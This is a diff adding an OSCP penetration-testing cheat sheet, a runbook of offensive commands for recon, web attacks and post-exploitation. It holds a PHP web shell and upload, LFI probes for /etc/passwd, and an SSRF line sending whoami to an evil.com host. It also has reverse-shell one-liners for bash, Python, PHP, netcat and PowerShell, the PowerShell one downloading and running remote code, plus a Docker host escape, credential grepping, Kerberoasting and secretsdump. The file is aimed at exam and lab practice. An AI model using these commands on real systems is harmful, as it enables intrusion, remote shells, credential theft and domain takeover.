@@ -1,0 +1,203 @@
+# OSCP Cheatcode — comprehensive, reusable runbook
+
+## Usage notes
+- Use environment variables: TARGET=1.2.3.4; KALI=10.10.14.16
+- Prefer non-destructive enumeration. Document every command and timestamp results.
+
+########################
+# Recon & port scanning
+########################
+nmap -Pn -p- -T4 --min-rate=500 $TARGET
+nmap -Pn -sC -sV -p- -T4 $TARGET
+rustscan -a $TARGET -- -sC -sV -Pn
+masscan $TARGET -p1-65535 --rate=1000
+
+# Quick service/HTTP fingerprinting
+httpx -l hosts.txt -ports 80,443 -silent
+nmap -p80,443 --script http-enum -T4 $TARGET
+
+########################
+# Web discovery
+########################
+gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt -k
+ffuf -u http://$TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 50 -mc 200,301,302,401,403 -k
+feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -t 50
+
+########################
+# Common web checks
+########################
+# LFI
+curl -s "http://$TARGET/?file=../../../../etc/passwd"
+curl -s "http://$TARGET/?page=../../../../etc/passwd"
+
+# SSTI / Template injection quick probe (example)
+curl -s -d 'name={{7*7}}' http://$TARGET/route | grep 49
+
+# SSRF probe (DNS callback)
+curl -s "http://$TARGET/?url=http://$KALI.evil.com/$(whoami)" || true
+
+########################
+# File uploads & payloads
+########################
+printf '<?php system($_GET["cmd"]); ?>' > shell.php
+printf '<?php echo file_get_contents("/etc/passwd"); ?>' > read.php
+curl -s -F "file=@shell.php" http://$TARGET/upload -v
+
+########################
+# Reverse shells (portable one-liners)
+########################
+# Bash
+bash -i >& /dev/tcp/$KALI/4444 0>&1
+# Python
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$KALI'",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# PHP
+php -r '$sock=fsockopen("'$KALI'",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+# Netcat (if supports -e)
+nc -e /bin/sh $KALI 4444
+# PowerShell (Windows)
+powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://$KALI/shell.ps1')"
+
+########################
+# Listeners
+########################
+# Netcat
+nc -lvnp 4444
+# Socat
+socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+
+########################
+# Stabilize interactive shells
+########################
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw -echo; fg; reset
+
+########################
+# File transfer & serving
+########################
+python3 -m http.server 80
+scp user@$TARGET:/path/to/file .
+rsync -avz user@$TARGET:/path/to/dir ./localdir
+curl -O http://$KALI:8000/file
+
+########################
+# Linux enumeration (fast)
+########################
+uname -a
+id
+whoami
+ip a; ip r
+ss -tulpn
+ps auxf | head -n 40
+find / -maxdepth 3 -type f -name "*.conf" 2>/dev/null | head
+grep -Ri "password\|passwd\|secret\|token\|apikey" /etc /home /var 2>/dev/null | head -n 200
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+sudo -l
+
+########################
+# Privilege escalation patterns
+########################
+# Sudo misconfigs
+sudo -l
+# SUID binaries
+find / -type f -perm -4000 2>/dev/null
+getcap -r / 2>/dev/null
+
+# PATH hijack example (if binary executed from writable dir)
+echo 'export PATH=/tmp:$PATH' >> ~/.bashrc
+
+# Cron jobs and writable scripts
+ls -la /etc/cron* /var/spool/cron/crontabs
+grep -R "sh\|bash\|php\|python" /etc/cron* /etc/cron.d 2>/dev/null
+
+# Systemd unit inspection
+systemctl list-units --type=service --all | egrep -i "consul|docker|nginx|postgres|redis" || true
+systemctl cat consul.service 2>/dev/null || cat /etc/systemd/system/consul.service 2>/dev/null || true
+
+# Docker/container escape hints
+docker ps -a
+docker inspect <container> | egrep -i "Mounts|HostConfig|Privileged"
+ls -la /var/run/docker.sock
+docker run --rm -v /:/host alpine chroot /host sh -c "id"
+
+# Consul / local agents
+curl -s http://127.0.0.1:8500/v1/agent/self | head -n 80
+curl -s http://127.0.0.1:8500/v1/agent/services | head -n 80
+# If agent runs as root and ACLs aren't enforced, registering a check can execute commands as root
+
+########################
+# Kernel / public exploits (note: use only in lab)
+########################
+# Quick check kernel version and CVEs
+uname -r
+searchsploit linux kernel $(`uname -r` || true)
+
+########################
+# Windows / SMB / AD quick patterns
+########################
+smbclient -L //$TARGET -N
+smbclient //${TARGET}/Share -U user
+crackmapexec smb $TARGET -u user -p pass
+
+# MSSQL
+impacket-mssqlclient DOMAIN/USER:PASS@${TARGET}
+# Use xp_cmdshell if available
+EXEC xp_cmdshell 'whoami';
+
+# RDP / WinRM
+evil-winrm -i $TARGET -u user -p pass
+psexec.py DOMAIN/user:pass@$TARGET
+
+########################
+# Active Directory common flows
+########################
+impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC
+gpp-decrypt <blob>
+
+# AD CS / Certificate attacks (high level)
+certipy-ad find -u user@domain -p 'Pass' -dc-ip $DC -vulnerable
+certipy-ad req -u user@domain -p 'Pass' -dc-ip $DC -ca CA-NAME -template Template -upn administrator@domain
+
+########################
+# Kerberoast / ASREP
+########################
+impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER:$PASS -outputfile krb.out
+GetUserSPNs.py -request -dc-ip $DC $DOMAIN/$USER:$PASS
+
+########################
+# Common one-liners & helpers
+########################
+# Base64 encode / decode
+echo -n 'PAYLOAD' | base64
+echo 'BASE64' | base64 -d > out
+
+# Quick text search for secrets
+egrep -R "(?i)pass(word)?|secret|token|api_key|pw=|password" / -n 2>/dev/null | head -n 200
+
+# Convert file with colors to clean text (for paste)
+perl -pe 's/\e\[[0-9;]*[mK]//g' file_with_colors.txt > clean.txt
+
+########################
+# Post-exploit checklist
+########################
+- Enumerate users, groups, sudoers, services
+- Dump SSH keys and check authorized_keys
+- Search for credentials, certs, DB configs, scripts with creds
+- Check scheduled tasks, systemd units, docker mounts
+- Find lateral movement vectors and credentials
+
+########################
+# Reporting & exam discipline
+########################
+- Keep a running transcript (timestamps + commands) and copy outputs to evidence/.
+- Avoid destructive commands. If in doubt, capture and ask the proctor (exam rules).
+
+########################
+# Further reading and practice
+########################
+- HTB/OSCP writeups for real cases (search patterns: "consul privilege escalation", "docker host escape", "systemd unit exec priv esc")
+- Read the official docs for services you encounter (Consul, Docker, Systemd, Postgres)
+
+# End of file
